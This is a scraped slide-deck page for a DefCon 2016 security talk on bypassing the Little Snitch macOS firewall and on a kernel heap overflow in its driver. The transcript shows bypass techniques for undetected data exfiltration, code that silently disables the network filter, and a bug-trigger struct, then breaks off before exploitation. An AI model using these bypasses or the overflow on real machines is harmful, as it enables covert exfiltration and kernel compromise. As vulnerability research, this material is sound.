=== Content from speakerdeck.com_b9d1c9d0_20250124_131154.html ===

[Upgrade to Pro — share decks privately, control downloads, hide ads and more …](/pro)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg) Speaker Deck](/)

* [Features](/features)
* [Speaker Deck
  PRO](/pro)
* [Sign in](/signin)
* [Sign up for free](/signup)
* Search

* Search

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](/)
#### [DefCon 2016] I got 99 Problems, but  Little Sn...

Search

[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=47)

Patrick Wardle](/patrickwardle)
August 06, 2016

[Technology](/c/technology)

[4](/signin?return_to=%2Fpatrickwardle%2Fdefcon-2016-i-got-99-problems-but-little-snitch-aint-one "Star [DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one!")

 6.7k

# [DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one!

Security products should make our computers more secure, not less. Little Snitch is the de facto personal firewall for OS X that aims to secure a Mac by blocking unauthorized network traffic. Unfortunately bypassing this firewall's network monitoring mechanisms is trivial...and worse yet, the firewall's kernel core was found to contain an exploitable ring-0 heap-overflow. #fail

![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=128)

## [Patrick Wardle](/patrickwardle)

August 06, 2016

[Tweet](https://twitter.com/intent/tweet?url=https://speakerdeck.com/patrickwardle/defcon-2016-i-got-99-problems-but-little-snitch-aint-one&text=%5BDefCon+2016%5D+I+got+99+Problems%2C+but+%E2%80%A8Little+Snitch+ain%E2%80%99t+one%21)
 Share

## More Decks by Patrick Wardle

[See All by Patrick Wardle](/patrickwardle)

[Mirror Mirror: Restoring Reflective Code Loading on macOS](/patrickwardle/mirror-mirror-restoring-reflective-code-loading-on-macos "Mirror Mirror: Restoring Reflective Code Loading on macOS")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 90

[The Hidden Treasure of Crash Reports?](/patrickwardle/the-hidden-treasure-of-crash-reports "The Hidden Treasure of Crash Reports?")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 560

["Demystifying (& Bypassing) macOS's Background Task Management"](/patrickwardle/demystifying-and-bypassing-macoss-background-task-management "\"Demystifying (& Bypassing) macOS's Background Task Management\"")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 1.5k

[Mac-ing Sense of the 3CX Supply Chain Attack: Analysis of the macOS Payloads](/patrickwardle/mac-ing-sense-of-the-3cx-supply-chain-attack-analysis-of-the-macos-payloads "Mac-ing Sense of the 3CX Supply Chain Attack: Analysis of the macOS Payloads")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 520

[Nothing but Net: Leveraging macOS's Networking Frameworks to Heuristically Detect Malware](/patrickwardle/nothing-but-net-leveraging-macoss-networking-frameworks-to-heuristically-detect-malware "Nothing but Net: Leveraging macOS's Networking Frameworks to Heuristically Detect Malware")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 1.1k

[Making oRAT Go ...Further](/patrickwardle/making-orat-go-dot-dot-dot-further "Making oRAT Go ...Further ")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 250

[Making oRAT, Go](/patrickwardle/making-orat-go "Making oRAT, Go")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 1.4k

[Unmasking WindTape](/patrickwardle/unmasking-windtape "Unmasking WindTape")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 0

 1.3k

[Déjà Vu: Uncovering Stolen Algorithms in Commercial Products](/patrickwardle/deja-vu-uncovering-stolen-algorithms-in-commercial-products "Déjà Vu: Uncovering Stolen Algorithms in Commercial Products")
[![](https://secure.gravatar.com/avatar/870b7bb376357a99a0770837d9536d44?s=24)
patrickwardle](/patrickwardle)

 1

 580

## Other Decks in Technology

[See All in Technology](/c/technology)

[メールヘッダーを見てみよう](/hinono/meruhetudawojian-temiyou "メールヘッダーを見てみよう")
[![](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBK0E4QVE9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--c14565228e389cc750aba822e82cd3eb62c52353/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCem9MWm05eWJXRjBTU0lJYW5CbkJqb0dSVlE2RTNKbGMybDZaVjkwYjE5bWFXeHNXd2RwSFdrZCIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--9921bc95938c5ab6808e7bcfc69ae1cceac36ef1/gVCVZFkU_400x400.jpg)
hinono](/hinono)

 0

 130

[タイミーのデータ活用を支えるdbt Cloud導入とこれから](/ttccddtoki/taiminodetahuo-yong-wozhi-erudbt-clouddao-ru-tokorekara "タイミーのデータ活用を支えるdbt Cloud導入とこれから")
[![](https://secure.gravatar.com/avatar/739b3e6644385d832834f6d4db498642?s=24)
ttccddtoki](/ttccddtoki)

 1

 340

[2024AWSで個人的にアツかったアップデート](/nagisa53/2024awsdege-ren-de-niatukatutaatupudeto "2024AWSで個人的にアツかったアップデート")
[![](https://secure.gravatar.com/avatar/2d5e6f89ca694c34bf1b78012e0803f3?s=24)
nagisa53](/nagisa53)

 1

 110

[Amazon Q Developerで.NET Frameworkプロジェクトをモダナイズしてみた](/kenichirokimura/amazon-q-developer-transform-for-net "Amazon Q Developerで.NET Frameworkプロジェクトをモダナイズしてみた")
[![](https://secure.gravatar.com/avatar/4dadb861ac8491ce36c8447607d34c24?s=24)
kenichirokimura](/kenichirokimura)

 1

 200

[Godot Engineについて調べてみた](/unsoluble_sugar/godot-enginenituitediao-betemita "Godot Engineについて調べてみた")
[![](https://secure.gravatar.com/avatar/e629af0f4930348f61b8f5cc1af49870?s=24)
unsoluble\_sugar](/unsoluble_sugar)

 0

 450

[自社 200 記事を元に整理した読みやすいテックブログを書くための Tips 集](/masakihirose/zi-she-200-ji-shi-woyuan-nizheng-li-sitadu-miyasuitetukuburoguwoshu-kutameno-tips-ji "自社 200 記事を元に整理した読みやすいテックブログを書くための Tips 集")
[![](https://secure.gravatar.com/avatar/0e4763821f1dabdd2c222ce3a3c878c5?s=24)
masakihirose](/masakihirose)

 2

 360

[FinJAWS\_reinvent2024\_recap\_database](/asahihidehiko/finjaws-reinvent2024-recap-database "FinJAWS_reinvent2024_recap_database")
[![](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBelErQVE9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--6b25f3552d5895b6fedb05904519daa38202f8a1/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCem9MWm05eWJXRjBTU0lJYW5CbkJqb0dSVlE2RTNKbGMybDZaVjkwYjE5bWFXeHNXd2RwSFdrZCIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--9921bc95938c5ab6808e7bcfc69ae1cceac36ef1/AI-profile_400x400.jpg)
asahihidehiko](/asahihidehiko)

 2

 130

[PaaSの歴史と、 アプリケーションプラットフォームのこれから](/jacopen/paasnoli-shi-to-apurikesiyonpuratutohuomunokorekara "PaaSの歴史と、 アプリケーションプラットフォームのこれから")
[![](https://secure.gravatar.com/avatar/cbc297b07593321e52c75a9ebcc0f843?s=24)
jacopen](/jacopen)

 7

 1.6k

[あなたの知らないクラフトビールの世界](/miura55/anatanozhi-ranaikurahutobirunoshi-jie "あなたの知らないクラフトビールの世界")
[![](https://secure.gravatar.com/avatar/4b2f3a64637b51e81813accbe8a98083?s=24)
miura55](/miura55)

 0

 150

[Git scrapingで始める継続的なデータ追跡 / Git Scraping](/ohbarye/git-scraping "Git scrapingで始める継続的なデータ追跡 / Git Scraping")
[![](https://secure.gravatar.com/avatar/0ed400174f90a4bcee05f3455597932f?s=24)
ohbarye](/ohbarye)

 5

 530

[KMP with Crashlytics](/sansantech/20250115 "KMP with Crashlytics")
[![](https://speakerdeck.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBaXdWIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--cc2cef9d6e6f16138584e30e4e25844e2a867fa0/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCem9MWm05eWJXRjBTU0lJY0c1bkJqb0dSVlE2RTNKbGMybDZaVjkwYjE5bWFXeHNXd2RwSFdrZCIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--4ad392f1bbc219b5ee43c69f392557817650c021/icon_engnr_dev_256.png)
sansantech](/sansantech)
 [PRO](/pro)

 0

 260

[[IBM TechXchange Dojo]Watson Discoveryとwatsonx.aiでRAGを実現!事例のご紹介+座学②](/siyuanzh09/ibm-techxchange-dojo-watson-discoverytowatsonx-dot-aiteragwoshi-xian-shi-li-nogoshao-jie-plus-zuo-xue "[IBM TechXchange Dojo]Watson Discoveryとwatsonx.aiでRAGを実現!事例のご紹介+座学②")
[![](https://secure.gravatar.com/avatar/2afe51a509ad5a067010b77ecd051e9b?s=24)
siyuanzh09](/siyuanzh09)

 0

 120

## Featured

[See All Featured](/p/featured)

[Code Review Best Practice](/trishagee/code-review-best-practice "Code Review Best Practice")
[![](https://secure.gravatar.com/avatar/3d6ace9554821d552146413bcdf874f6?s=24)
trishagee](/trishagee)

 65

 17k

[Save Time (by Creating Custom Rails Generators)](/garrettdimon/save-time-by-creating-custom-rails-generators "Save Time (by Creating Custom Rails Generators)")
[![](https://secure.gravatar.com/avatar/a9179349dd2bdc67f377719f56d85656?s=24)
garrettdimon](/garrettdimon)
 [PRO](/pro)

 29

 960

[We Have a Design System, Now What?](/morganepeng/we-have-a-design-system-now-what "We Have a Design System, Now What?")
[![](https://secure.gravatar.com/avatar/95d9f37115fbb0d13135d0f77132f856?s=24)
morganepeng](/morganepeng)

 51

 7.3k

[Helping Users Find Their Own Way: Creating Modern Search Experiences](/danielanewman/helping-users-find-their-own-way-creating-modern-search-experiences " Helping Users Find Their Own Way: Creating Modern Search Experiences")
[![](https://secure.gravatar.com/avatar/3d4519fd34b76fb265fc0237f3792bd4?s=24)
danielanewman](/danielanewman)

 29

 2.4k

[Done Done](/chrislema/done-done "Done Done")
[![](https://secure.gravatar.com/avatar/282d599b414022eba5096510f675b6e2?s=24)
chrislema](/chrislema)

 182

 16k

[No one is an island. Learnings from fostering a developers community.](/thoeni/no-one-is-an-island-learnings-from-fostering-a-developers-community "No one is an island. Learnings from fostering a developers community.")
[![](https://secure.gravatar.com/avatar/6bb82b13cda86d3b821fa44100335ddf?s=24)
thoeni](/thoeni)

 19

 3.1k

[How to Create Impact in a Changing Tech Landscape [PerfNow 2023]](/tammyeverts/how-to-create-impact-in-a-changing-tech-landscape-perfnow-2023 "How to Create Impact in a Changing Tech Landscape [PerfNow 2023]")
[![](https://secure.gravatar.com/avatar/00f8c4fb73c2d12646895291e0e008a3?s=24)
tammyeverts](/tammyeverts)

 49

 2.2k

[Keith and Marios Guide to Fast Websites](/keithpitt/keith-and-marios-guide-to-fast-websites "Keith and Marios Guide to Fast Websites")
[![](https://secure.gravatar.com/avatar/e14f55d3f939977cecbf51b64ff6f861?s=24)
keithpitt](/keithpitt)

 410

 22k

[Java REST API Framework Comparison - PWX 2021](/mraible/java-rest-api-framework-comparison-pwx-2021 "Java REST API Framework Comparison - PWX 2021")
[![](https://secure.gravatar.com/avatar/72a2082c6a4dd79ad68befb3db911616?s=24)
mraible](/mraible)

 28

 8.3k

[The Web Performance Landscape in 2024 [PerfNow 2024]](/tammyeverts/the-web-performance-landscape-in-2024-perfnow-2024 "The Web Performance Landscape in 2024 [PerfNow 2024]")
[![](https://secure.gravatar.com/avatar/00f8c4fb73c2d12646895291e0e008a3?s=24)
tammyeverts](/tammyeverts)

 3

 360

[Rails Girls Zürich Keynote](/gr2m/rails-girls-zurich-keynote "Rails Girls Zürich Keynote")
[![](https://secure.gravatar.com/avatar/24fc194843a71f10949be18d5a692682?s=24)
gr2m](/gr2m)

 94

 13k

[ReactJS: Keep Simple. Everything can be a component!](/pedronauck/reactjs-keep-simple-everything-can-be-a-component "ReactJS: Keep Simple. Everything can be a component!")
[![](https://secure.gravatar.com/avatar/af6a12710770ad9a7cfd08c97efd40d3?s=24)
pedronauck](/pedronauck)

 666

 120k

## Transcript

1. ### [@patrickwardle I got 99 Problems, but   Little Snitch ain’t](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_0.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! @patrickwardle I got 99 Problems, but   Little ...")

   one!
2. ### [WHOIS “leverages the best combination of humans and technology to](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_1.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! WHOIS “leverages the best combination of humans...")

   discover security vulnerabilities in our customers’ web apps, mobile apps, IoT devices and infrastructure endpoints” @patrickwardle security for the 21st century career hobby
3. ### [making little snitch our b!tch OUTLINE understanding bypassing reversing owning](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_2.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! making little snitch our b!tch OUTLINE understa...")

   little snitch  versions < 3.6.2 apple os x 10.11 note:
4. ### [UNDERSTANDING LITTLE SNITCH …a brief overview](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_3.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! UNDERSTANDING LITTLE SNITCH …a brief overview ")
5. ### [the de-facto host firewall for macOS LITTLE SNITCH "Little Snitch](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_4.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! the de-facto host firewall for macOS LITTLE SNI...")

   intercepts connection attempts, and lets you decide how to proceed." -www.obdev.at little snitch alert in the news (red team vs. palantir)
6. ### [the puzzle pieces LITTLE SNITCH COMPONENTS ring-0 ring-3 (root session)](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_5.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! the puzzle pieces LITTLE SNITCH COMPONENTS ring...")

   LittleSnitch.kext Little Snitch Daemon Little Snitch Configuration Little Snitch Agent ›network, process monitoring 'authentication' › ›rules management ›rules management preferences › ›ui alerts ring-3 (user/UI session) ring-0 bug
7. ### [BYPASSING LITTLE SNITCH undetected data exfil IMHO; such bypasses aren't](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_6.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! BYPASSING LITTLE SNITCH undetected data exfil I...")

   bugs or 0days
8. ### [abusing system rules to talk to iCloud LITTLE SNITCH BYPASS](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_7.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! abusing system rules to talk to iCloud LITTLE S...")

   0X1 iCloud little snitch's iCloud rule o rly!?...yes! un-deletable system rule: "anybody can talk to iCloud"
9. ### [abusing 'proc-level' trust LITTLE SNITCH BYPASS 0X2 $ python dylibHijackScanner.py](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_8.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! abusing &#39;proc-level&#39; trust LITTLE SNITCH BYPASS...")

   GPG Keychain is vulnerable (weak/rpath'd dylib) 'weak dylib': '/Libmacgpg.framework/Versions/B/Libmacgpg' 'LC\_RPATH': '/Applications/GPG Keychain.app/Contents/Frameworks' undetected exfil/C&C "Using Process Infection to Bypass Windows Software Firewalls" -Phrack, '04 gpg keychain; allow all dylib hijack 'injection'
10. ### [stop the network filter LITTLE SNITCH BYPASS 0X3 ring-0 method](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_9.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! stop the network filter LITTLE SNITCH BYPASS 0X...")

    0xB disable: 0x0 ring-3 LittleSnitch.kext //connect & authenticate to kext // ->see later slides for details :) //input // ->set to 0x0 to disable uint64\_t input = 0x0; //stop network filter IOConnectCallScalarMethod(connectPort, 0xB, &input, 0x1, NULL, NULL); 'invisible' to UI //input // ->disable is 0x0 if( (0xB == method) && (0x0 == scalarInput) ) { //disable filter! } 'stop network filter'
11. ### [REVERSING LITTLE SNITCH poking on the kext's interface](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_10.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! REVERSING LITTLE SNITCH poking on the kext&#39;s in...")
12. ### [/Library/Extensions/LittleSnitch.kext LITTLE SNITCH'S KEXT $ less LittleSnitch.kext/Contents/Info.plist <?xml version="1.0" encoding="UTF-8"?>](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_11.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! /Library/Extensions/LittleSnitch.kext LITTLE SN...")

    <plist version="1.0"> <dict> <key>CFBundleExecutable</key> <string>LittleSnitch</string> <key>CFBundleIdentifier</key> <string>at.obdev.nke.LittleSnitch</string> <key>CFBundlePackageType</key> <string>KEXT</string> <key>IOKitPersonalities</key> <dict> <key>ODLSNKE</key> <dict> <key>CFBundleIdentifier</key> <string>at.obdev.nke.LittleSnitch</string> <key>IOClass</key> <string>at\_obdev\_LSNKE</string> <key>IOMatchCategory</key> <string>at\_obdev\_LSNKE</string> <key>IOProviderClass</key> <string>IOResources</string> <key>IOResourceMatch</key> <string>IOBSD</string> </dict> </dict> ... kext's Info.plist file i/o kit signing info
13. ### [XNU's device driver env I/O KIT self-contained, runtime environment implemented](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_12.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! XNU&#39;s device driver env I/O KIT self-contained,...")

    in C++ object-oriented › "Mac OS X and iOS Internals"  "OS X and iOS Kernel Programming"   "IOKit Fundamentals" (apple.com) #include <IOKit/IOLib.h> #define super IOService OSDefineMetaClassAndStructors(com\_osxkernel\_driver\_IOKitTest, IOService) bool com\_osxkernel\_driver\_IOKitTest::init(OSDictionary\* dict) { bool res = super::init(dict); IOLog("IOKitTest::init\n"); return res; } IOService\* com\_osxkernel\_driver\_IOKitTest::probe(IOService\* provider, SInt32\* score) { IOService \*res = super::probe(provider, score); IOLog("IOKitTest::probe\n"); return res; } bool com\_osxkernel\_driver\_IOKitTest::start(IOService \*provider) { bool res = super::start(provider); IOLog("IOKitTest::start\n"); return res; } ... $ sudo kextload IOKitTest.kext   $ grep IOKitTest /var/log/system.log users-Mac kernel[0]: IOKitTest::init users-Mac kernel[0]: IOKitTest::probe users-Mac kernel[0]: IOKitTest::start load kext; output i/o kit resources › › › sample i/o kit driver
14. ### ['inter-ring' comms I/O KIT serial port driver open(/dev/xxx) read() /](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_13.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! &#39;inter-ring&#39; comms I/O KIT serial port driver o...")

    write() other i/o kit drivers find driver; then: I/O Kit Framework read/write 'properties' send control requests "The user-space API though which a process communicates with a kernel driver is provided by a framework known as 'IOKit.framework'"   -OS X and iOS Kernel Programming today's focus or
15. ### [invoking driver methods I/O KIT //look up method, invoke super](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_14.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! invoking driver methods I/O KIT //look up metho...")

    externalMethod(selector, ...) ring-0 //check params, invoke method super::externalMethod(..., dispatch, ...) } selector (method index) ›dispatch = methods[selector] dispatch (method) method\_0(); method\_1(); method\_2(); ring-3
16. ### [ex; user 'client' I/O KIT mach\_port\_t masterPort = 0; io\_service\_t](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_15.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! ex; user &#39;client&#39; I/O KIT mach_port_t masterPor...")

    service = 0;    //get master port IOMasterPort(MACH\_PORT\_NULL, &masterPort); //get matching service service = IOServiceGetMatchingService(masterPort, IOServiceMatching("com\_osxkernel\_driver\_IOKitTest")); io\_connect\_t driverConnection = 0; //open connection IOServiceOpen(service, mach\_task\_self(), 0, &driverConnection); find driver open/create connection struct TimerValue { uint64\_t time, uint64\_t timebase; }; struct TimerValue timerValue = { .time=500, .timebase=0 }; //make request to driver  IOConnectCallStructMethod(driverConnection, kTestUserClientDelayForTime, timerValue, sizeof(TimerValue), NULL, 0); kern\_return\_t IOConnectCallStructMethod( mach\_port\_t connection, uint32\_t selector, const void \*inputStruct, size\_t inputStructCnt, void \*outputStruct, size\_t \*outputStructCnt ); send request IOKitLib.h IOConnectCallStructMethod function "OS X and iOS Kernel Programming"   (chapter 5) selector
17. ### [service: 'at\_obdev\_LSNKE' FIND/CONNECT TO LITTLE SNITCH'S KEXT char -[m097e1b4e m44e2ed6c](void](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_16.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! service: &#39;at_obdev_LSNKE&#39; FIND/CONNECT TO LITTL...")

    \* self, void \* \_cmd) { ... sub\_10003579a(0x7789); } int sub\_10003579a(int arg0) { r15 = arg0; rbx = IOMasterPort(0x0, 0x0);  r14 = IOServiceGetMatchingService(0x0, IOServiceNameMatching("at\_obdev\_LSNKE")); r15 = IOServiceOpen(r14, \*\_mach\_task\_self\_, r15, 0x10006ed58); mach\_port\_t masterPort = 0; io\_service\_t serviceObject = 0; io\_connect\_t connectPort = 0; IOMasterPort(MACH\_PORT\_NULL, &masterPort); serviceObject = IOServiceGetMatchingService(masterPort, IOServiceMatching("at\_obdev\_LSNKE")); IOServiceOpen(serviceObject, mach\_task\_self(), 0x7789, &connectPort); little snitch daemon (hopper decompilation) $ ./connect2LS got master port: 0xb03 got matching service (at\_obdev\_LSNKE): 0xf03 opened service (0x7789): 0x1003 custom 'connection' code connected!
18. ### ['reachable' kernel methods ENUMERATING AVAILABLE INTERFACES class\_externalMethod proc push rbp](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_17.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! &#39;reachable&#39; kernel methods ENUMERATING AVAILABL...")

    mov rbp, rsp cmp esi, 16h ja short callSuper mov eax, esi lea rax, [rax+rax\*2] lea rcx, IORegistryDescriptorC3::sMethods lea rcx, [rcx+rax\*8] ... callSuper: mov rax, cs:IOUserClient\_vTable pop rbp jmp qword ptr [rax+860h] IOKitTestUserClient::externalMethod(uint32\_t selector, IOExternalMethodArguments\* arguments, IOExternalMethodDispatch\* dispatch, OSObject\* target, void\* reference) if(selector <= 16) dispatch = (IOExternalMethodDispatch\*)&sMethods[selector]; return super::externalMethod(selector, arguments, dispatch, target, reference); IORegistryDescriptorC3\_sMethods IOExternalMethodDispatch <0FFFFFF7FA13ED82Ah, 0, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED832h, 0, 0, 1, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED846h, 0, 0, 0, 83Ch> IOExternalMethodDispatch <0FFFFFF7FA13ED89Ah, 0, 0Ch, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED8D2h, 0, 0, 0, 10h> IOExternalMethodDispatch <0FFFFFF7FA13ED82Ah, 0, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED82Ah, 0, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED8FAh, 0, 20h, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED944h, 0, 10h, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED95Ah, 0, 0, 1, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED97Eh, 0, 0, 1, 0> IOExternalMethodDispatch <0FFFFFF7FA13ED9CEh, 1, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDA84h, 1, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDAC6h, 0, 0, 0, 10h> IOExternalMethodDispatch <0FFFFFF7FA13EDBBAh, 0, 0, 0, 10h> IOExternalMethodDispatch <0FFFFFF7FA13EDBCEh, 0, 0, 0, 80h> IOExternalMethodDispatch <0FFFFFF7FA13EDBFAh, 0, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDC0Eh, 1, 0, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDC22h, 0, 0Ch, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDC36h, 0, 10h, 0, 18h> IOExternalMethodDispatch <0FFFFFF7FA13EDC4Ah, 0, 0, 0, 2Ch> IOExternalMethodDispatch <0FFFFFF7FA13EDC86h, 0, 54h, 0, 0> IOExternalMethodDispatch <0FFFFFF7FA13EDCC2h, 1, 0, 0, 0> class methods ('sMethods') method #7 struct IOExternalMethodDispatch { IOExternalMethodAction function; uint32\_t checkScalarInputCount; uint32\_t checkStructureInputSize; uint32\_t checkScalarOutputCount; uint32\_t checkStructureOutputSize; }; IOExternalMethodDispatch struct pseudo code ls' externalMethod() IOUserClient.h
19. ### [it haz bug! SAY HELLO TO METHOD 0X7 IOExternalMethodDispatch](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_18.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! it haz bug! SAY HELLO TO METHOD 0X7 IOExternalM...")

    <0FFFFFF7FA13ED8FAh, 0, 20h, 0, 0> 0XFFFFFF7F86FED8FA method\_0x7 proc ... mov rax, [rdi] ; this pointer, vTable mov rax, [rax+988h] ; method mov rsi, rdx jmp rax +0x0 \_\_const:FFFFFF7FA13F5A30 vTable ... ... +0x988 \_\_const:FFFFFF7FA13F63B8 dq offset sub\_FFFFFF7FA13EABB2 sub\_FFFFFF7FA13EABB2 proc mov rbx, rsi mov rdi, [rbx+30h] ; user-mode (ls) struct call sub\_FFFFFF7FA13E76BC sub\_FFFFFF7FA13E76BC proc near call sub\_FFFFFF7FA13E76F7 sub\_FFFFFF7FA13E76F7 proc near mov rbx, rdi ; user-mode struct mov rdi, [rbx+8] ; size test rdi, rdi jz short leave ; invalid size cmp qword ptr [rbx], 0 jz short leave mov rsi, cs:allocTag call \_OSMalloc ; malloc ... mov rdi, [rbx] ; in buffer mov rdx, [rbx+8] ; size mov rsi, rax ; out buffer (just alloc'd) call \_copyin struct lsStruct { void\* buffer size\_t size; ... }; sub\_FFFFFF7FA13E76F7(struct lsStruct\* ls) { if( (0 == ls->size) || (NULL == ls->buffer) ) goto bail; kBuffer = OSMalloc(ls->size, tag); if(NULL != kBuffer) copyin(ls->buffer, kBuffer, ls->size); method 0x7 'call thru' malloc/copy (pseudo-code) malloc/copy (IDA)
20. ### [32bit size matters ;) KERNEL BUG? void\* OSMalloc( uint32\_t size](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_19.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! 32bit size matters ;) KERNEL BUG? void* OSMallo...")

    ...); libkern/libkern/OSMalloc.h int copyin(..., vm\_size\_t nbytes ); osfmk/x86\_64/copyio.c offset 15 ... 8 7 6 5 4 3 2 1 0 value 1 0 0 0 0 0 0 0 2 64bit 64bit value: 0x100000002 32bit value: 0x100000002 struct lsStruct ls; ls.buffer = <some user addr>; ls.size = 0x100000002; //malloc & copy kBuffer = OSMalloc(0x00000002, tag); if(NULL != kBuffer) copyin(ls->buffer, kBuffer, 0x100000002); vs. kernel heap heap buffer   [size: 2 bytes] rest of heap.... heap buffer   [size: 2 bytes] rest of heap.... 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 vm\_size\_t is 64bits! kernel heap
21. ### [OWNING LITTLE SNITCH exploitation?](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_20.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! OWNING LITTLE SNITCH exploitation? ")
22. ### [gotta 'authenticate' ISSUE 0X1 method\_0x7 proc cmp byte ptr [rdi+0E9h],](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_21.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! gotta &#39;authenticate&#39; ISSUE 0X1 method_0x7 proc ...")

